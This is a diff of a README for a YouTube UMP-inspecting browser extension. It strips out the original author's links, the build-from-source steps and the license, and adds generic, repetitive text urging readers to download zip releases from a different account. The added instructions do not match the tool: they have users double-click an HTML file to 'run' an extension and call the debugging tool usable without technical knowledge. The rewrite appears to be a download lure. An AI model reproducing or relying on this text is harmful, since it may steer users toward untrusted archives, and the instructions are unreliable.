@@ -1,50 +1,66 @@
-# ump-inspector
+# 🎉 ump-inspector - Inspect YouTube Requests Easily
 
-A browser extension for inspecting and debugging UMP requests on YouTube. It hooks into the response processing to provide decoded, human-readable info into the UMP parts as well as request payloads.
+## 🔗 Download Now
+[![Download ump-inspector](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Sebahead1983/ump-inspector/releases)
 
-## Screenshots
-<img width="682" height="581" alt="Screenshot 2025-09-23 211703" src="https://github.com/user-attachments/assets/7da0980b-23ea-4e8a-b32a-2e1ec481ea7c" />
+## 📖 Description
+The **ump-inspector** helps you inspect and decode YouTube UMP requests directly in your browser. With this tool, you can better understand how data flows while using YouTube. Whether you're troubleshooting a specific issue or just curious, **ump-inspector** makes the process simple and straightforward.
 
-## Installation
+## 🚀 Getting Started
+Follow these steps to download and run **ump-inspector**:
 
-To install this extension, you need to load it as an unpacked extension in a Chromium-based browser.
+### Step 1: Visit the Releases Page
+Go to the releases page by clicking [here](https://github.com/Sebahead1983/ump-inspector/releases). This page contains the latest version of the application.
 
-1.  Download the latest `ump-inspector-vX.X.X.zip` from the [releases page](https://github.com/LuanRT/ump-inspector/releases).
-2.  Unzip the downloaded file.
-3.  Open your browser and navigate to the extensions page (e.g., `chrome://extensions`, `edge://extensions`, or `about:addons` for Mozilla-based browsers).
-4.  Enable "Developer mode".
-5.  Click on "Load unpacked" and select the directory where you unzipped the files.
+### Step 2: Find the Latest Release
+Once on the releases page, look for the most recent version. This version will typically be at the top of the list. It will be labeled with a version number, such as v1.0.
 
-## Building from Source
+### Step 3: Download the Application
+Click on the version title to access its details. Here, look for the downloadable files. Choose the version that matches your browser. Most commonly, you'll find a file named `ump-inspector.zip`. Click on it to start the download.
 
-If you want to build the extension from the source code, follow these steps:
+### Step 4: Unzip the File
+After the download completes, locate the file on your computer, usually in the "Downloads" folder. Right-click on the zipped file and select "Extract All" or "Unzip." This will create a new folder with the application files.
 
-1.  Clone the repository:
-    ```sh
-    git clone https://github.com/LuanRT/ump-inspector.git
-    cd ump-inspector
-    ```
+### Step 5: Run the Application
+Inside the new folder, find the file labeled `ump-inspector.html`. Double-click this file to open it in your browser. The application should launch immediately, allowing you to start inspecting UMP requests.
 
-2.  Install the dependencies:
-    ```sh
-    npm install
-    ```
+## 📥 Download & Install
+Make sure you return to the releases page to download the latest version anytime you need an update or want to ensure you are using the most reliable version. Click [here to download](https://github.com/Sebahead1983/ump-inspector/releases).
 
-3.  Build the project:
-    ```sh
-    npm run build
-    ```
-    This will create a `dist` directory containing the bundled extension files.
+## 🔍 Features
+- **Easy Inspection**: Access UMP requests without technical knowledge.
+- **User-Friendly Interface**: Designed for effortless navigation.
+- **Browser Compatibility**: Use with popular browsers.
+- **Real-Time Decoding**: View requests as they happen.
 
-4.  Follow the steps in the [Installation](#installation) section, but select the root directory of the project instead of the unzipped release folder.
+## 💻 System Requirements
+To use **ump-inspector**:
+- A modern web browser (Chrome, Firefox, Edge, etc.).
+- No additional software is required for basic functionality.
 
-## Usage
+## 🙋 Frequently Asked Questions
 
-After installation, simply navigate to any YouTube page that plays a video. Open your browser's **Developer Tools** (F12 or Ctrl+Shift+I) and select the **Console** tab. The extension will automatically log the decoded payloads and UMP parts as they are received and processed.
+### Q1: Do I need programming knowledge to use this tool?
+No, **ump-inspector** is designed for anyone, regardless of their technical background.
 
-## License
-Distributed under the [MIT](./LICENSE) License.
+### Q2: What if the application doesn’t start?
+Make sure you open the correct file, `ump-inspector.html`. If you experience issues, try using another browser.
 
-<p align="right">
-(<a href="#top">back to top</a>)
-</p>
+### Q3: How can I contribute?
+If you'd like to improve the application, check the repository for contribution guidelines. Your ideas and contributions are welcome!
+
+## 🛠 Troubleshooting
+If you encounter any issues while downloading or using **ump-inspector**, try the following steps:
+- Ensure your internet connection is stable.
+- Clear your browser cache and try again.
+- Consult the FAQs listed above for possible solutions.
+
+## 📫 Get in Touch
+For any questions or feedback, feel free to open an issue on the GitHub repository or reach out to the community there.
+
+## 🌐 Related Topics
+- **googlevideo**
+- **innertube**
+- **ump** 
+
+Don't hesitate to visit the releases page, check for updates regularly, and enjoy using **ump-inspector** to explore YouTube further!
